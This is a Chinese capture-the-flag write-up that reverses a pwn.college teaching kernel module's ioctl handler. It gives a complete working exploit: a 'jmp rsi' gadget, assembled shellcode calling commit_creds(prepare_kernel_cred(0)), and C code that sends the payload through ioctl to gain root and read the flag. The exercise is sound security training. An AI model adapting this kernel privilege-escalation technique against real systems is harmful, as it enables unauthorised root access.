之前写完前面四个的时候凌晨 4 点了，剩下最后一题没写

babykernel 补完



## babykernel_level5_teaching1.ko

![image-20210224204729323](https://gitee.com/scriptkiddies/images/raw/master/image-20210224204729323.png)

老样子，通过 `ioctl` 去控制

### device_ioctl

```asm
__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  _QWORD *v3; // rbx
  __int64 result; // rax
  __int64 v5; // rax

  v3 = (_QWORD *)arg; // v3 指向我们 ioctl 的第 3 个参数
  printk(&unk_1018); // 输出 banner
  result = -1LL;
  if ( cmd == 1337 ) // 操作码是 1337 ，也就是 ioctl 的第二个参数
  {
    result = -2LL;
    if ( *v3 <= 0x1000uLL ) // 可以看到 v3 是一个 _QWORD 的类型，也就是 64 bit 的长整形
    {
      copy_from_user(shellcode, v3 + 1); // 复制 arg 第 64bit 之后的内容到 shellcode
      v5 = v3[513]; // v5 就是 rax，rax 存入 v3[513] 处的 64bits 数据
      _x86_indirect_thunk_rax(); // call rax，也就是说 v3[513] 需要放一个有效的地址，这个地址就是后面要执行的
      result = 0LL;
    }
  }
  return result;
}
```

可以看汇编

```asm
.text.unlikely:0000000000000F6C ; __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
.text.unlikely:0000000000000F6C device_ioctl    proc near               ; DATA XREF: .data:fops↓o
.text.unlikely:0000000000000F6C file = rdi                              ; file *
.text.unlikely:0000000000000F6C cmd = rsi                               ; unsigned int
.text.unlikely:0000000000000F6C arg = rdx                               ; unsigned __int64
.text.unlikely:0000000000000F6C                 push    rbp
.text.unlikely:0000000000000F6D                 mov     rcx, arg
.text.unlikely:0000000000000F70                 mov     ebp, esi
.text.unlikely:0000000000000F72 cmd = rbp                               ; unsigned int
.text.unlikely:0000000000000F72                 push    rbx
.text.unlikely:0000000000000F73                 mov     rbx, arg
.text.unlikely:0000000000000F76 arg = rbx                               ; unsigned __int64
.text.unlikely:0000000000000F76                 mov     edx, esi
.text.unlikely:0000000000000F78                 mov     rsi, file
.text.unlikely:0000000000000F7B                 mov     file, offset unk_1018
.text.unlikely:0000000000000F82                 call    printk          ; PIC mode
.text.unlikely:0000000000000F87                 or      rax, 0FFFFFFFFFFFFFFFFh
.text.unlikely:0000000000000F8B                 cmp     ebp, 539h
.text.unlikely:0000000000000F91                 jnz     short loc_FC4
.text.unlikely:0000000000000F93                 mov     rdx, [arg]
.text.unlikely:0000000000000F96                 mov     rax, 0FFFFFFFFFFFFFFFEh
.text.unlikely:0000000000000F9D                 cmp     rdx, 1000h
.text.unlikely:0000000000000FA4                 ja      short loc_FC4
.text.unlikely:0000000000000FA6                 mov     rdi, cs:shellcode
.text.unlikely:0000000000000FAD                 lea     rsi, [arg+8]
.text.unlikely:0000000000000FB1                 call    _copy_from_user ; PIC mode
.text.unlikely:0000000000000FB6                 mov     rax, [arg+1008h] # 可以看到 rax 存的是 arg+1008h 位置的内容
.text.unlikely:0000000000000FBD                 call    __x86_indirect_thunk_rax ; PIC mode
.text.unlikely:0000000000000FC2                 xor     eax, eax
.text.unlikely:0000000000000FC4
.text.unlikely:0000000000000FC4 loc_FC4:                                ; CODE XREF: device_ioctl+25↑j
.text.unlikely:0000000000000FC4                                         ; device_ioctl+38↑j
.text.unlikely:0000000000000FC4                 pop     arg
.text.unlikely:0000000000000FC5                 pop     cmd
.text.unlikely:0000000000000FC6
.text.unlikely:0000000000000FC6 locret_FC6:                             ; DATA XREF: .orc_unwind_ip:0000000000001305↓o
.text.unlikely:0000000000000FC6                                         ; .orc_unwind_ip:0000000000001309↓o ...
.text.unlikely:0000000000000FC6                 retn
.text.unlikely:0000000000000FC6 device_ioctl    endp
```



思路：

```asm
.text.unlikely:0000000000000FB6                 mov     rax, [arg+1008h] # 可以看到 rax 存的是 arg+1008h 位置的内容
.text.unlikely:0000000000000FBD                 call    __x86_indirect_thunk_rax ; PIC mode
.text.unlikely:0000000000000FC2                 xor     eax, eax
```

因为是把 `arg+1008h` 当成一个指针，指向 `call rax` 要跳到的指令的地址

我想到的是 `rop`

用一个 `jmp rsi` 执行做跳板调到 `shellcode`

就是在 `arg+1008h`  放入 `jmp rsi` 的地址，这样我们只需要在我们 `ioctl` 的 第三个参数的第  `8` 个字节之后构造 `shellcode` 就能 通过 `jmp rsi` 跳到 `shellcode` 执行

因为可以看到 

```asm
.text.unlikely:0000000000000FAD                 lea     rsi, [arg+8]
```

`rsi` 是存着 `arg+8` 的地址，所以理论成立，开始实践，现在找 `gadget`

```zsh
# r00t @ FakeLinux in ~/code/kernel/pwnkernel/linux-5.4 on git:main x [21:16:52]
$ /home/r00t/.local/bin/ROPgadget --binary ./vmlinux | grep "jmp rsi"
```

得到一堆结果，然后我找到了这个：

```asm
0xffffffff810213b4 : jmp rsi
```

好了，写 `payload`，还是使用 `commit_creds(prepare_kernel_cred(0));` 进行提权

sc.asm

```asm
push rsi;
mov rsi, 0xffffffff810881c0; # prepare_kernel_cred
push rdi;
xor rdi, rdi;
call rsi;
mov rdi, rax;
mov rsi, 0xffffffff81087e80; # commit_creds
call rsi;
pop rdi;
pop rsi;
ret;
```

`rasm2` 编译

```zsh
# r00t @ FakeLinux in ~ [21:19:46]
$ rasm2 -a x86 -b 64 -C -f sc.asm
"\x56\x48\xbe\xc0\x81\x08\x81\xff\xff\xff\xff\x57\x48\x31\xff\xff\xd6\x48\x89\xc7" \
"\x48\xbe\x80\x7e\x08\x81\xff\xff\xff\xff\xff\xd6\x5f\x5e\xc3"
```

得到 `shellcode`，长度 `35`，我们还需要填充 `0x1008 - 35 - 8` 字节，然后放入 `jmp rsi` 的地址，为什么 `-35` 又 `-8` ？

因为前 `8` 个字节是 `v3`，`v3` 是个 `64` 位的长整形，需要小于 `0x1000` ，我们直接用 `0` 填充

构造 payload

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

int main() {
  char *scTmp = "\x56\x48\xbe\xc0\x81\x08\x81\xff\xff\xff\xff\x57\x48\x31\xff\xff\xd6\x48\x89\xc7\x48\xbe\x80\x7e\x08\x81\xff\xff\xff\xff\xff\xd6\x5f\x5e\xc3";
  char *shellcode;
  shellcode = mmap(NULL, 4500, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED| MAP_ANON, -1, 0);
  if(shellcode == NULL) {
    printf("mmap fail!\n");
    exit(-1);
  }
  memset(shellcode, 0, 8); // 用 0 填充前 8 个字节
  memcpy(shellcode + 8, scTmp, 35); // commit_creds(prepare_kernel_cred(0)); 
  memset(shellcode + 8 + 35, 0x90, 4061); // 0x90 填充
  memcpy(shellcode + 4104,  "\xb4\x13\x02\x81\xff\xff\xff\xff", 8); // jmp rsi
  int fd = open("/proc/pwncollege", O_WRONLY);
  printf("%d\n", fd);
  ioctl(fd, 1337, shellcode);
  system("id");
  system("cat /flag");
  return 0;
}
```

pwn！

![image-20210225010000177](https://gitee.com/scriptkiddies/images/raw/master/image-20210225010000177.png)



其实这个题目有个坑

就是如果你的 `shellcode` 放的那块内存是不可执行的话就会失败，之前我的 `payload` 是放在一个字符数组里面，数组是放在栈上的

```c
char shellcode[] = {"\x56\x48\xbe\xc0\x81\x08\x81\xff\xff\xff\xff\x57\x48\x31\xff\xff\xd6\x48\x89\xc7\x48\xbe\x80\x7e\x08\x81\xff\xff\xff\xff\xff\xd6\x5f\x5e\xc3"};
```

但是我编译的时候没有开启 栈可执行 当跳到 shellcode 执行时就会发生错误，会提示内存页不可执行，所以我才用 mmap 分配一块 可读可写可执行的 内存

结束！

```zsh
# r00t @ FakeLinux in ~ [1:12:20]
$ date
Thu 25 Feb 2021 01:12:21 AM CST
```

